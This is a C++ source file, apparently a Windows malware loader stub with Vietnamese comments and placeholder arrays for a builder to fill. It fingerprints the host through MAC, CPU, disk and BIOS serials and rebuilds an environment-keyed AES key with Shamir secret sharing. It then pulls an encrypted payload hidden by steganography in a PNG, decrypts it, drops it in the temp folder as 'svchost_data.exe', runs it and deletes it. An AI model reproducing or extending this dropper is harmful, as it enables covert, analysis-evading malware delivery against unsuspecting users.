
#define STB_IMAGE_IMPLEMENTATION
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <bcrypt.h>
#include <iphlpapi.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <comdef.h>
#include <WbemIdl.h>
#include <fstream>
#include "stb_image.h"

// MSVC (Visual Studio)
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wbemuuid.lib")

// Macro cho BCRYPT
#define BCRYPT_SUCCESS(status) (((NTSTATUS)(status)) >= 0)


// --- 1. CÁC BIẾN CÔNG KHAI  ---
// Dung de builder fill du lieu vao

// 2. payloadsize
unsigned int payload_size = 0x12345678;

// 3. Hash Verify (32 bytes): 
unsigned char hash_key_verif[8][32] = {
{
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA
},
{
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA
},
{
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA
},
{
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA
},
{
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA
},
{
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA
},
{
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA
},
{
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA
} 
};

// 4. CheckBytes (8x5 bytes):
unsigned char check_bytes[8][5] = { { 0xBB, 0xBB, 0xBB, 0xBB, 0xBB }, 
{ 0xBB, 0xBB, 0xBB, 0xBB, 0xBB },
{ 0xBB, 0xBB, 0xBB, 0xBB, 0xBB },
{ 0xBB, 0xBB, 0xBB, 0xBB, 0xBB },
{ 0xBB, 0xBB, 0xBB, 0xBB, 0xBB },
{ 0xBB, 0xBB, 0xBB, 0xBB, 0xBB },
{ 0xBB, 0xBB, 0xBB, 0xBB, 0xBB },
{ 0xBB, 0xBB, 0xBB, 0xBB, 0xBB } };

// 5. Share_Y (8x5 bytes): 
unsigned char share_y[8][5] = { { 0xCC, 0xCC, 0xCC, 0xCC, 0xCC }, 
{ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC },
{ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC },
{ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC },
{ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC },
{ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC },
{ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC },
{ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC } };

// --- 2. HÀM TOÁN HỌC TRƯỜNG HỮU HẠN  ---

uint8_t gf_mul(uint8_t a, uint8_t b){
    uint8_t p = 0;

    for (int i = 0; i < 8; i++) {
        if (b & 1) {
            p ^= a;
        }
        uint8_t hi_bit = (a & 0x80);
        a <<= 1;
        if (hi_bit) {
            a ^= 0x11b;
        }
        b >>= 1;
    }
    return p; 
}


uint8_t gf_inv(uint8_t n) {
    if (n == 0) return 0;
    for (int i = 1; i < 256; i++) {
        if (gf_mul(n, i) == 1) {
            return (uint8_t)i;
        }
    }
    return 0;
}
    
uint8_t gf_div(uint8_t a, uint8_t b) {
    return gf_mul(a, gf_inv(b));
}

uint8_t sss_decrypt(uint8_t x[], uint8_t y[], int k) {
    uint8_t secret = 0;
    for (int i = 0; i < k; i++) {
        uint8_t li = 1;
        for (int j = 0; j < k; j++) {
            if (i != j) {
                uint8_t num = x[j];
                uint8_t den = x[j] ^ x[i];
                li = gf_mul(li, gf_div(num, den));
            }
        }
        secret ^= gf_mul(y[i], li);
    }
    return secret;
}

// --- 3. CÁC HÀM LẤY THÔNG TIN HỆ THỐNG ---

// A. Mac address
void get_mac(char* out) {
    IP_ADAPTER_INFO AdapterInfo[16];
    DWORD dwBufLen = sizeof(AdapterInfo);
    
    if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_SUCCESS) {
        sprintf(out, "%02X%02X%02X%02X%02X%02X",
            AdapterInfo[0].Address[0], AdapterInfo[0].Address[1],
            AdapterInfo[0].Address[2], AdapterInfo[0].Address[3],
            AdapterInfo[0].Address[4], AdapterInfo[0].Address[5]);
        // 123456789012 
    }
}

// B. Computer Name
void get_comp_name(char* out) {
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameA(out, &size);
}

// C. Processor ID
void get_cpu_id(char* out) {
    int cpuInfo[4];
    __cpuid(cpuInfo, 1);
    sprintf(out, "%08X%08X", (unsigned int)cpuInfo[3], (unsigned int)cpuInfo[0]); // Ép kiểu cho sprintf an toàn
}

// D. Volume Serial
void get_vol_serial(char* out) {
    DWORD serial;
    GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
    sprintf(out, "%08X", (unsigned int)serial);
}

// E. BIOS Serial
// wmic bios get serialnumber
void get_bios_serial(char* out) {
    // 1. thiết lập môi trường COM
    HRESULT hres;
    strcpy(out, "UNKNOWN");
    // khởi tạo thư viện COM cho luồng hiện tại
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) return;
    // thiết lập bảo mật mặc định cho tiến trình
    // Lấy danh nghĩa ng dùng hiện tại để truy cập vào thông tin hệ thống
    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    //
    // 2. Tạo kết nối tới WMI Service
    // Tạo đối tượng Locator
    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hres)) { CoUninitialize(); return; }
    // Kết nối vào ROOT\CIMV2 chứa thông tin phần cứng
    IWbemServices* pSvc = NULL;
    BSTR bstrNamespace = SysAllocString(L"ROOT\\CIMV2");
    hres = pLoc->ConnectServer(bstrNamespace, NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
    SysFreeString(bstrNamespace);
    
    if (FAILED(hres)) { pLoc->Release(); CoUninitialize(); return; }
    
    // 3. Thiết lập quyền thực thi
    hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

    // 4. Truy vấn BIOS Serial bằng WMI QL
    IEnumWbemClassObject* pEnumerator = NULL;
    BSTR bstrWQL = SysAllocString(L"WQL");
    BSTR bstrQuery = SysAllocString(L"SELECT SerialNumber FROM Win32_BIOS");
    hres = pSvc->ExecQuery(bstrWQL, bstrQuery,
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
        
    SysFreeString(bstrWQL);
    SysFreeString(bstrQuery);

    if (SUCCEEDED(hres)) {
        IWbemClassObject* pclsObj = NULL;
        ULONG uReturn = 0;
        while (pEnumerator) {
            hres = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
            if (0 == uReturn) break;

            VARIANT vtProp;
            // Lấy giá trị cụ thể của SerialNumber
            hres = pclsObj->Get(L"SerialNumber", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres)) {
                if (vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
                    wcstombs(out, vtProp.bstrVal, 256); // chuyển Wide char sang multi-bytes
                }
                VariantClear(&vtProp);
            }
            pclsObj->Release();
            break;
        }
    }

    // 6. Giải phóng bộ nhớ
    if (pEnumerator) pEnumerator->Release();
    if (pSvc) pSvc->Release();
    if (pLoc) pLoc->Release();
    CoUninitialize();
}

// --- 4. HÀM BĂM SHA-256 VÀ XOR FOLDING ---

uint8_t sha256_xor_fold(const char* input) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    DWORD cbHash = 0, cbData = 0;
    BYTE hash[32];

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
    BCryptHashData(hHash, (PUCHAR)input, (ULONG)strlen(input), 0);
    BCryptFinishHash(hHash, hash, 32, 0);

    // XOR Fold : trai -> phai
    uint8_t folded = hash[0];
    for (int i = 1; i < 32; i++) {
        folded ^= hash[i];
    }

    BCryptDestroyHash(hHash);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return folded;
}


// kiem tra hash
bool verify_key(uint8_t candidate_key, const unsigned char* expected_hash) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    BYTE hash[32];

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
    // Băm đúng 1 byte của candidate_key
    BCryptHashData(hHash, (PUCHAR)&candidate_key, 1, 0); 
    BCryptFinishHash(hHash, hash, 32, 0);

    BCryptDestroyHash(hHash);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    // kiem tra tung byte
    for (int i = 0; i < 32; i++) {
        if (hash[i] != expected_hash[i]) {
            return false;
        }
    }
    return true;
}

// --- 5. HÀM GIẢI MÃ AES-128-ECB PKCS#7 DÙNG BCRYPT ---

// Hàm giải mã AES-128-ECB với PKCS#7 unpadding
unsigned char* aes_ecb_decrypt(const unsigned char* ciphertext, size_t ciphertext_len, 
                                const unsigned char* key, size_t& plaintext_len) {
    // 1. Kiểm tra đầu vào bản mã
    if (ciphertext_len % 16 != 0 || ciphertext_len == 0) {
        printf("[D] Bản mã không hợp lệ (không chia hết cho 16 hoặc bằng 0)\n");
        return NULL;
    }
 
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbKeyObject = 0, cbData = 0;
    PBYTE pbKeyObject = NULL;
    PBYTE pbKeyDataBlob = NULL;
 
    // Giữ nguyên thiết lập mặc định của bạn: Key dài 16 bytes (AES-128)
    const DWORD key_len = 16; 
 
    // 2. Mở Algorithm Provider cho AES
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[D] Lỗi BCryptOpenAlgorithmProvider: 0x%08X\n", status);
        return NULL;
    }
 
    // 3. Set Chaining Mode thành ECB
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_ECB, 
                               (wcslen(BCRYPT_CHAIN_MODE_ECB) + 1) * sizeof(WCHAR), 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[D] Lỗi BCryptSetProperty (ECB): 0x%08X\n", status);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }
 
    // 4. Lấy kích thước Key Object
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(cbKeyObject), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[D] Lỗi BCryptGetProperty (OBJECT_LENGTH): 0x%08X\n", status);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }
 
    pbKeyObject = (PBYTE)malloc(cbKeyObject);
    if (!pbKeyObject) {
        printf("[D] Lỗi cấp phát pbKeyObject\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }
 
    // 5. Tạo cấu trúc Key Data Blob chuẩn của Windows CNG
    DWORD dwBlobSize = sizeof(BCRYPT_KEY_DATA_BLOB_HEADER) + key_len;
    pbKeyDataBlob = (PBYTE)malloc(dwBlobSize);
    if (!pbKeyDataBlob) {
        printf("[D] Lỗi cấp phát pbKeyDataBlob\n");
        free(pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }
 
    BCRYPT_KEY_DATA_BLOB_HEADER* pHeader = (BCRYPT_KEY_DATA_BLOB_HEADER*)pbKeyDataBlob;
    pHeader->dwMagic = BCRYPT_KEY_DATA_BLOB_MAGIC;   // 0x4D42444B
    pHeader->dwVersion = 1;                          // <-- SỬA LỖI Ở ĐÂY: Thay macro bằng số 1 trực tiếp
    pHeader->cbKeyData = key_len;
    
    // Copy 16 bytes key vào vùng nhớ ngay sau bộ Header
    memcpy(pbKeyDataBlob + sizeof(BCRYPT_KEY_DATA_BLOB_HEADER), key, key_len);
 
    // 6. Import Key vào hệ thống
    status = BCryptImportKey(hAlg, NULL, BCRYPT_KEY_DATA_BLOB, &hKey, 
                             pbKeyObject, cbKeyObject, pbKeyDataBlob, dwBlobSize, 0);
    if (!BCRYPT_SUCCESS(status)) {
        printf("[D] Lỗi BCryptImportKey: 0x%08X\n", status);
        free(pbKeyDataBlob);
        free(pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }
 
    // 7. Cấp phát bộ nhớ cho Plaintext chứa dữ liệu giải mã
    unsigned char* plaintext = (unsigned char*)malloc(ciphertext_len);
    if (!plaintext) {
        printf("[D] Lỗi cấp phát bộ nhớ Plaintext\n");
        BCryptDestroyKey(hKey);
        free(pbKeyDataBlob);
        free(pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }
 
    // 8. Thực hiện giải mã AES-ECB
    ULONG plaintext_size = 0;
    status = BCryptDecrypt(hKey, (PBYTE)ciphertext, (ULONG)ciphertext_len, NULL,
                           NULL, 0, plaintext, (ULONG)ciphertext_len, &plaintext_size, 0);
 
    // Giải phóng sớm các tài nguyên cấu hình khóa (không còn cần thiết sau khi giải mã xong)
    BCryptDestroyKey(hKey);
    free(pbKeyDataBlob);
    free(pbKeyObject);
    BCryptCloseAlgorithmProvider(hAlg, 0);
 
    if (!BCRYPT_SUCCESS(status)) {
        printf("[D] Lỗi BCryptDecrypt: 0x%08X\n", status);
        free(plaintext);
        return NULL;
    }
 
    // 9. Kiểm tra tính hợp lệ và loại bỏ PKCS#7 padding
    uint8_t padding_len = plaintext[plaintext_size - 1];
    if (padding_len > 16 || padding_len == 0) {
        printf("[D] Lỗi Padding không hợp lệ (Đọc được byte cuối: %d)\n", padding_len);
        free(plaintext);
        return NULL;
    }
 
    for (size_t i = plaintext_size - padding_len; i < plaintext_size; i++) {
        if (plaintext[i] != padding_len) {
            printf("[D] Lỗi định dạng PKCS#7 padding sai quy luật tại vị trí %zu\n", i);
            free(plaintext);
            return NULL;
        }
    }
 
    // Trả ra kết quả chuẩn độ dài thực tế của dữ liệu sạch
    plaintext_len = plaintext_size - padding_len;
    return plaintext;
}
// --- 5. LOGIC GIẢI MÃ VÀ THỰC THI ---

// Hàm lấy payload từ file PNG (steganography)
unsigned char* load_payload_from_png(const char* png_path, size_t& payload_size) {
    int width, height, channels;
    
    // Thư viện tự động parse PNG, giải nén zlib, xử lý filter 
    // và trả về mảng pixel RGBA thô (ép buộc 4 channels)
    unsigned char* image_data = stbi_load(png_path, &width, &height, &channels, 4);
    if (!image_data) {
        printf("[D] Loi mo hoac giai ma hinh anh bang stb_image\n");
        return NULL;
    }

    size_t total_channels = width * height * 4;

    if (total_channels < 8) {
        printf("[D] Anh khong du kich thuoc de chua thong tin do dai\n");
        stbi_image_free(image_data);
        return NULL;
    }

    // Bước 1: Trích xuất 8 nibbles đầu tiên từ các kênh màu để tính độ dài payload
    unsigned char len_bytes[4];
    for (int i = 0; i < 4; i++) {
        unsigned char high_nibble = image_data[2 * i] & 0x0F;
        unsigned char low_nibble = image_data[2 * i + 1] & 0x0F;
        len_bytes[i] = (high_nibble << 4) | low_nibble;
    }

    uint32_t data_len = ((uint32_t)len_bytes[0] << 24) | 
                        ((uint32_t)len_bytes[1] << 16) | 
                        ((uint32_t)len_bytes[2] << 8)  | 
                        ((uint32_t)len_bytes[3]);

    printf("[D] Bat dau trich xuat, do dai payload = %u bytes\n", data_len);

    // Kiểm tra tính hợp lệ bảo mật bộ nhớ
    if (8 + (size_t)data_len * 2 > total_channels || data_len == 0) {
        printf("[D] Do dai payload khong phu hop , hoac vuot qua kich thuoc anh! \n");
        stbi_image_free(image_data);
        return NULL;
    }

    unsigned char* payload = (unsigned char*)malloc(data_len);
    if (!payload) {
        stbi_image_free(image_data);
        return NULL;
    }

    printf("[D] Xong buoc Kiem tra tinh hop le, bat dau trich xuat payload...\n");
    // Bước 2: Trích xuất payload thực tế từ kênh màu thứ 8 trở đi
    for (size_t i = 0; i < data_len; i++) {
        size_t idx = 8 + (i * 2);
        unsigned char high_nibble = image_data[idx] & 0x0F;
        unsigned char low_nibble = image_data[idx + 1] & 0x0F;
        payload[i] = (high_nibble << 4) | low_nibble;
    }

    payload_size = data_len;
    stbi_image_free(image_data); // Giải phóng vùng nhớ ảnh thô
    return payload;
}

// --- 5. LOGIC GIẢI MÃ VÀ THỰC THI ---

// ham lay tai nguyen:

#define IDR_PAYLOAD1 101
// tim file rc co ID = 101


void execute_payload(unsigned char* data, unsigned int size) {
    // --- PHAN DEBUG HEADER ---
    printf("[D] Bat dau kiem tra cau truc file sau giai ma...\n");

    if (size < 64) {
        printf("[D] LOI: Kich thuoc payload qua nho (%u bytes), khong the la file EXE.\n", size);
    } else {
        // 1. Kiem tra 2 byte dau (MZ)
        printf("[D] 2 byte dau tien: %02X %02X (ASCII: %c%c)\n",  data[0], data[1], (data[0] >= 32 ? data[0] : '.'), (data[1] >= 32 ? data[1] : '.'));

        if (data[0] == 'M' && data[1] == 'Z') {
            printf("[D] Tim thay dau hieu MZ.\n");

            // 2. Doc offset cua PE Header tai vi tri 0x3C (60)
            // Dung kieu unsigned int de lay 4 byte dia chi
            unsigned int pe_offset = *(unsigned int*)(&data[0x3C]);
            printf("[D] PE Header offset tai 0x3C la: 0x%08X\n", pe_offset);

            // 3. Kiem tra chu PE (50 45) tai vi tri offset vua tim duoc
            if (pe_offset + 4 <= size) {
                printf("[D] Kiem tra chu ky PE tai offset 0x%X: %02X %02X\n", pe_offset, data[pe_offset], data[pe_offset + 1]);
                
                if (data[pe_offset] == 'P' && data[pe_offset + 1] == 'E') {
                    printf("[D] File PE  hop le.\n");
                } else {
                    printf("[D] Khong thay PE. Giai ma sai.\n");
                }
            } else {
                printf("[D] LOI: PE offset nam ngoai pham vi file.\n");
            }
        } else {
            printf("[D] Khong thay MZ. Giai ma sai r\n");
        }
    }
    printf("___________________________________________\n");
    // --- HET PHAN DEBUG HEADER ---


    char temp_path[MAX_PATH];
    char file_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    sprintf(file_path, "%ssvchost_data.exe", temp_path);

    printf("[D] Duong dan file tam: %s\n", file_path);

    // Ghi file tam
    HANDLE hFile = CreateFileA(file_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[D] Loi tao file tam!\n");
        return;
    } else {
        printf("[D] Tao file tam thanh cong.\n");
    }

    DWORD written;
    if (WriteFile(hFile, data, size, &written, NULL)) {
        if (written == size) {
            printf("[D] Ghi file thanh cong, %lu bytes.\n", written);
        } else {
            printf("[D] Ghi file that bai, chi ghi %lu/%lu bytes.\n", written, size);
        }
    } else {
        printf("[D] Loi ghi file, ma loi: %lu\n", GetLastError());
    }
    CloseHandle(hFile);

    // Chạy file
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessA(file_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("[D] Chay file thanh cong.\n");
        WaitForSingleObject(pi.hProcess, INFINITE); // Đợi chạy xong
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[D] Chay file that bai, ma loi: %lu\n", GetLastError());
    }

    // Xóa file tạm
    if (DeleteFileA(file_path)) {
        printf("[D] Xoa file tam thanh cong.\n");
    } else {
        printf("[D] Xoa file tam that bai, ma loi: %lu\n", GetLastError());
    }
}

int main() {
    char info[5][256];
    get_mac(info[0]);
    get_comp_name(info[1]);
    get_cpu_id(info[2]);
    get_vol_serial(info[3]);
    get_bios_serial(info[4]);

    //debug
    printf("[D] Cac thong tin lay ra:\n");
    printf("MAC: %s\n", info[0]);
    printf("PC Name: %s\n", info[1]);
    printf("CPU ID: %s\n", info[2]);
    printf("Disk Serial: %s\n", info[3]);
    printf("BIOS Serial: %s\n", info[4]);
    printf("___________________________________________\n");

    uint8_t S[5];
    for (int i = 0; i < 5; i++) {
        S[i] = sha256_xor_fold(info[i]);
        // debug 
        printf("[D] S[%d] (Folded Hash): 0x%02X\n", i, S[i]);
    }

    // x[8][5]
    uint8_t x_all[8][5];
    printf("\n[D] KHOI PHUC X-COORDINATES:\n");
    for (int i = 0; i < 8; i++) {
        for (int j=0; j<5; j++) {
            x_all[i][j] = S[j] ^ check_bytes[i][j];
            printf("    x_all[%d][%d] = %d (S:0x%02X ^ Check:0x%02X)\n", i,j, x_all[i][j] , S[j], check_bytes[i][j]);
        }
    }
    printf("___________________________________________\n\n");

    printf("\n[D] KHOI PHUC Y-COORDINATES: \n");
    for (int i=0; i<8; i++) {
        for (int j=0; j<5; j++) {
            printf("share_y[%d][%d] = %d\n ",i , j ,share_y[i][j]);
        }
    }
    printf("___________________________________________\n\n");

    // C(5,3)
    int combinations[10][3] = {
        {0,1,2}, {0,1,3}, {0,1,4}, {0,2,3}, {0,2,4},
        {0,3,4}, {1,2,3}, {1,2,4}, {1,3,4}, {2,3,4}
    };

    uint8_t final_key[8] = {0,0,0,0,0,0,0,0};
    bool found[8] = {false,false,false,false,false,false,false,false};
    uint8_t totalFound = 0;

    //rintf("[D] Hash_key_verify: %c\n", hash_key_verif);
    //rintf("___________________________________\n");

    // giải mã lần lượt 8 byte khoá
    for (int i = 0; i < 8; i++) {
        // mỗi byte khoá thử 10 bộ 3
        for (int j=0; j<10; j++) {
            uint8_t x_try[3] = { x_all[i][combinations[j][0]], x_all[i][combinations[j][1]], x_all[i][combinations[j][2]] };
            uint8_t y_try[3] = { share_y[i][combinations[j][0]], share_y[i][combinations[j][1]], share_y[i][combinations[j][2]] };

            // Giai ma
            uint8_t key_candidate = sss_decrypt(x_try, y_try, 3);

            // [QUAN TRỌNG] Hiển thị giá trị ASCII/Số của khóa ứng với mỗi tổ hợp
            printf("[D] Xet byte khoa thu %d\n: ", i );
            printf("[D] To hop %d (Indices: %d, %d, %d):\n", j, combinations[j][0], combinations[j][1], combinations[j][2]);
            printf("    -> Key Candidate: [Dec: %d] [Hex: 0x%02X]\n", key_candidate, key_candidate);

            if (verify_key(key_candidate, hash_key_verif[i])) {
                final_key[i] = key_candidate;
                found[i] = true;
                totalFound +=1;
                printf("    [+] KHOP VOI HASH VERIFY! Tim thay key[%d]: 0x%02X\n\n", i , final_key[i]);
                break; 
            } else {
                printf("    [-] Khong khop.\n\n");
            }
        }
    }
    
    if (totalFound == 8) {
        // Lấy payload từ file PNG (thay vì .rsrc)
        size_t encrypted_payload_size = 0;
        unsigned char* encrypted_payload = load_payload_from_png("mphoto.png", encrypted_payload_size);
        
        if (encrypted_payload && encrypted_payload_size > 0) {
            // Nhân đôi khoá 8 byte thành 16 byte
            unsigned char aes_key[16];
            for (int i = 0; i < 8; i++) {
                aes_key[i] = final_key[i];
                aes_key[i + 8] = final_key[i];
            }

            // Giải mã AES-128-ECB với PKCS#7 unpadding
            size_t decrypted_len = 0;
            unsigned char* decrypted_payload = aes_ecb_decrypt(encrypted_payload, encrypted_payload_size, aes_key, decrypted_len);

            if (decrypted_payload && decrypted_len > 0) {
                printf("[D] Giai ma AES thanh cong, dang thuc thi....");
                execute_payload(decrypted_payload, (unsigned int)decrypted_len);
                free(decrypted_payload); // giai phong bo nho
            }
            else {
                printf("[D] giai ma AES khong thanh cong :< \n");
            }

            free(encrypted_payload);
        }
        else {
            printf("[D] Trich xuat payload tu png Khong thanh cong\n");
        }
    }
    
    // debug
    else {
        printf("[D] Khong tim thay khoa dung\n");
        printf("___________________________________________");
    }

    return 0;
}

// Chu y: Khi biên dịch bật flag /MT lên để tránh báo lỗi